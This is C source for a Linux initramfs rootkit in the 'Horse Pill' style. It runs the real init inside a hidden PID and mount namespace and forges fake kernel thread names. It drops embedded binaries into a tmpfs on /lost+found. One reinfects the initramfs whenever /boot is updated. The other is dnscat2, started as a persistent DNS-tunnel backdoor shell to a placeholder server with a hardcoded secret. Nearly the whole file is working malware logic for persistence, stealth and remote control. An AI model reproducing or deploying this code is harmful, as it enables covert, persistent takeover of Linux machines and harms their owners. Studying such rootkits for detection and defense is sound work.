#include "horsepill.h"

#include <sys/mount.h>
#include <sys/inotify.h>
#include <sys/reboot.h>
#include <sys/wait.h>
#include <sys/prctl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/utsname.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <ctype.h>
#include <signal.h>
#include <dirent.h>

#include "dnscat.h"
#include "reinfect.h"

#define DNSCAT_PATH	"/lost+found/dnscat"

#ifndef MS_RELATIME
#define MS_RELATIME     (1<<21)
#endif
#ifndef MS_STRICTATIME
#define MS_STRICTATIME  (1<<24)
#endif
#ifndef CLONE_NEWNS
#define CLONE_NEWNS     0x00020000
#endif
#ifndef CLONE_NEWPID
#define CLONE_NEWPID    0x20000000
#endif

pid_t init_pid;

extern pid_t __clone(int, void *);
static inline int raw_clone(unsigned long flags, void *child_stack) {
	return __clone(flags, child_stack);
}

/**
 * is_process - this function check, from the name, if it is a process
 * @name: name of file in /proc
 * 
 * Returns:
 *  - 1 if the name is name of process
 *  - 0 otherwise
 */
static int is_process(char *name)
{
	int i;
	for (i = 0; i < strlen(name); i++) {
		if (!isdigit(name[i]))
			return 0;
	}

	return 1;
}

/**
 * grab_kernel_thread - this function transform the name of processes
 * @name: name of file in /proc
 * 
 * Returns: return a new pid name
 */
static char* grab_kernel_thread(char *name)
{
	FILE* stat;
	char buf[4096];

	int pid;
	char pidname[4096];
	char newpidname[4096];
	char state;
	int ppid;

	char *ret = NULL;

	memset((void*)newpidname, 0, sizeof(newpidname));
	snprintf(buf, sizeof(buf) - 1, "/proc/%s/stat", name);
	
	stat = fopen(buf, "r");
	if (stat == NULL)
		goto out;
	
	fgets(buf, sizeof(buf) - 1, stat);
	sscanf(buf, "%d %s %c %d", &pid, pidname, &state, &ppid);
	
	if (pid != 1 && (ppid == 0 || ppid == 2)) {
		for (unsigned int i = 0; i <= strlen(pidname); i++) {
			char c = pidname[i];
			if (c == '(')
				c = '[';
			else if (c == ')')
				c = ']';

			newpidname[i] = c;
		}
		ret = strdup(newpidname);
	}
	fclose(stat);
out:
	return ret;
}

/**
 * grab_kernel_threads - this function saves the elaborated names of processes in /proc
 * @threads: array of char* to put names of processes
 * 
 */
static void grab_kernel_threads(char **threads)
{
	DIR *dirp;
	int i = 0;
	struct dirent *dp;

	if ((dirp = opendir("/proc")) == NULL)
		exit(EXIT_FAILURE);

	do {
		errno = 0;
		if ((dp = readdir(dirp)) != NULL) {
			if (dp->d_type == DT_DIR && is_process(dp->d_name)) {
				char *name = grab_kernel_thread(dp->d_name);
				if (name) {
					threads[i] = name;
					i++;
				}
			}
		}
	} while (dp != NULL);

	if (errno != 0)
		exit(EXIT_FAILURE);
	
	closedir(dirp);
}

/**
 * prctl_operations - this function sets argv and name to the process
 * @title: name of the process to set argv
 * 
 * Returns:
 *  - 0 if all prctl operations has been correctly executed
 *  - 1 otherwise
 */
static int prctl_operations(char *title)
{
	static char *proctitle = NULL;
	char buf[2048], *tmp;
	FILE *f;
	int i, len, ret = 0;
	unsigned long arg_start, arg_end;

	f = fopen("/proc/self/stat", "r");
	if (!f)
		return -1;

	tmp = fgets(buf, sizeof(buf), f);
	fclose(f);
	if (!tmp)
		return -1;

	// skip the first 47 fields to point at arg_start and arg_end
	tmp = strchr(buf, ' ');
	for (i = 0; i < 46; i++) {
		if (!tmp)
			return -1;
		tmp = strchr(tmp+1, ' ');
	}
	if (!tmp)
		return -1;

	i = sscanf(tmp, "%lu %lu", &arg_start, &arg_end);
	if (i != 2)
		return -1;

	// include the null byte here
	len = strlen(title) + 1;

	// if we don't have enough room by just overwriting the old proctitle, let's allocate a new one
	if (len > arg_end - arg_start) {
		void *m;
		m = realloc(proctitle, len);
		if (!m)
			return -1;
		proctitle = m;

		arg_start = (unsigned long) proctitle;
	}

	arg_end = arg_start + len;

        // execute prctl operations
	ret = prctl(PR_SET_MM, PR_SET_MM_ARG_START, (long) arg_start, 0, 0);
	if (ret == 0) {
                strcpy((char*)arg_start, title);
                ret = prctl(PR_SET_MM, PR_SET_MM_ARG_END, (long) arg_end, 0, 0);
                if (ret == 0) {
                        memset((void*)buf, 0, sizeof(buf));
                        strncpy(buf, title+1, strlen(title)-2);

                        if (prctl(PR_SET_NAME, (unsigned long)buf, 0, 0, 0) < 0)
                                exit(EXIT_FAILURE);
                }
        }

	return ret;
}

/**
 * make_kernel_threads - this function creates the threads
 * @threads: array of processes names to create
 * 
 */
static void make_kernel_threads(char **threads)
{
	int i;
	if (fork() == 0) {
		// special case for pid 2 (kthreadd)
                prctl_operations(threads[0]);

		for (i = 1; threads[i]; i++) {
			if (fork() == 0) {
				// all other kernel threads are children of pid 2
				prctl_operations(threads[i]);

				while(1)
					pause();

				exit(EXIT_FAILURE); // should never reach here
			}
		}

		while(1)
			pause();
		
		exit(EXIT_FAILURE); // should never reach here
	}
}

/**
 * write_executable - this function writes an executable into a specific path
 * @path: path where put the executable
 * @exe: array of unsigned char that represent byte-per-byte executable
 * @exe_len: length of array @exe
 * 
 */
static void write_executable(char *path, unsigned char* exe, unsigned int exe_len)
{
	FILE* exe_file = NULL;
	exe_file = fopen(path, "w+");
	if (exe_file) {
		fwrite((const void*)exe, 1, exe_len, exe_file);
		fclose(exe_file);
		chmod(path, S_IXUSR | S_IRUSR);
	}
}

/**
 * run_dnscat2 - this function runs dnscat2 process and pass in command line the argument to connect to the server
 * 
 * Returns: pid of dnscat2 process
 */
static pid_t run_dnscat2()
{
	pid_t pid;
	char *argv[5];

	pid = fork();
	if (pid < 0)
		exit(EXIT_FAILURE);

	if (pid == 0) {
		memset((void*)argv, 0, sizeof(argv));

		// fill command line arguments
		argv[0] = "dnscat";
		argv[1] = "--dns";
		argv[2] = "server=xxx.xxx.xxx.xxx,port=53531";
		argv[3] = "--secret=fa11fa11fa11fa11fa11fa11fa11fa11";

		execv(DNSCAT_PATH, argv);
		exit(EXIT_FAILURE);
	}
	
	return pid;
}

/**
 * handle_init_exit - this procedure handles the exit of init process
 **/
static void handle_init_exit(int status)
{
	// init exited for unknown reason
	if (!WIFSIGNALED(status))
		exit(EXIT_FAILURE);
	
	// queries the termination status of a child process to determine which signal caused the child process to exit
	int signum = WTERMSIG(status);

	if (signum == SIGHUP) // tell deamons to reload beacuse configuration files are changed
		reboot(LINUX_REBOOT_CMD_RESTART, NULL);
	else if (signum == SIGINT)
		reboot(LINUX_REBOOT_CMD_POWER_OFF, NULL);
	
	exit(EXIT_FAILURE);
}

/**
 * on_sigint - this procedure is handler of SIGINT to send SIGINT to child
 **/
static void sigint_handler()
{
	kill(init_pid, SIGINT);
}

/**
 * hook_update_initramfs - this procedure hooks the update of initramfs
 **/
void hook_update_initramfs() 
{
	int length, i;
	int fd;
	int wd;
	pid_t pid;
	char buffer[1024 * (sizeof(struct inotify_event) + 16)];
	char command[1024];

	pid = fork();
	if (pid < 0)
		return;

	if (pid == 0) {
		fd = inotify_init();
		if (fd < 0)
			return; // error in installation of inotify_init
		
		wd = inotify_add_watch(fd, "/boot/", IN_MOVE);
		
		while (1) {
			length = read(fd, buffer, 1024 * (sizeof(struct inotify_event) + 16));
			i = 0;

			while (i < length) {
				struct inotify_event *event = (struct inotify_event *) &buffer[i];
				
                                if (event->len && (event->mask & IN_MOVED_TO)) {
					if (strcmp(event->name,"initrd.img-5.13.0-40-generic")==0)
						system("/lost+found/reinfect /boot/initrd.img-5.13.0-40-generic");
				}
				
                                i += sizeof(struct inotify_event) + event->len;
			}
		}

		inotify_rm_watch(fd, wd);
		close(fd);
	}
}

/**
 * save_run_init - this procedure save run-init in the scratch space 
 **/
void save_run_init() {
	system("mkdir /lost+found/old-initramfs/");

        // unpack old initramfs to save infected run-init
        system("unmkinitramfs /boot/initrd.img-5.13.0-40-generic /lost+found/old-initramfs");

        // save only run-init
        system("mv /lost+found/old-initramfs/main/usr/bin/run-init /lost+found/run-init");

        // delete rest of old initramfs
        system("rm -rf /lost+found/old-initramfs");
}

/**
 * perform_hacks - this procedure is entry point just prior to running init
 **/
void perform_hacks()
{
	char *kthreads[1024];

	// enumerate kernel threads
	memset((void*)kthreads, 0, sizeof(kthreads));
	grab_kernel_threads(kthreads);
	
	// clone(CLONE_NEWPID, CLONE_NEWNS)
	init_pid = raw_clone(SIGCHLD | CLONE_NEWPID | CLONE_NEWNS, NULL);
	if (init_pid < 0)
		exit(EXIT_FAILURE);
	
	if (init_pid > 0) { // parent process - the real init
		pid_t dnscat_pid;

		// mount scratch space
		if (mount("tmpfs", "/lost+found", "tmpfs", MS_STRICTATIME, "mode=755") < 0)
			exit(EXIT_FAILURE);

		// install signal handler to handle signal delivered ctrl-alt-delete, which we will send to child init
		signal(SIGINT, sigint_handler);
		reboot(LINUX_REBOOT_CMD_CAD_OFF, NULL);

		// wait for things to come up and networking to be ready
		sleep(20);

		// remount root
		if (mount(NULL, "/", NULL, MS_REMOUNT | MS_RELATIME, "errors=remount-ro,data=ordered") < 0)
			exit(EXIT_FAILURE);

		// save run-init to the scratch space
		save_run_init();

		// write executable of reinfect
		write_executable("/lost+found/reinfect", reinfect, reinfect_len);

		// spawn a process to hook updates
		hook_update_initramfs();

		// write executable of dnscat2
		write_executable(DNSCAT_PATH, dnscat, dnscat_len);
		
		// spawn a process for backdoor shell
		dnscat_pid = run_dnscat2();

		// watching for dnscat exit and watching waitpid for init
		while(1) {
			int status;
			pid_t pid;

			pid = waitpid(-1, &status, 0);
			if (pid < 0) {
				if (errno != EINTR) // if not interrupted via signal
					exit(EXIT_FAILURE);
			} else if (pid == init_pid) {
				handle_init_exit(status);
			} else if (pid == dnscat_pid) {
 				dnscat_pid = run_dnscat2();
			}
			sleep(1);
		}
	} else { // child process - this process will run the victim init
		// remount /proc
		if (umount("/proc") < 0)
			exit(EXIT_FAILURE);
		if (mount("proc", "/proc", "proc", MS_NOEXEC | MS_NODEV | MS_NOSUID | MS_RELATIME, NULL) < 0)
			exit(EXIT_FAILURE);
		
		// make fake kernel threads
		make_kernel_threads(kthreads);
	}
}
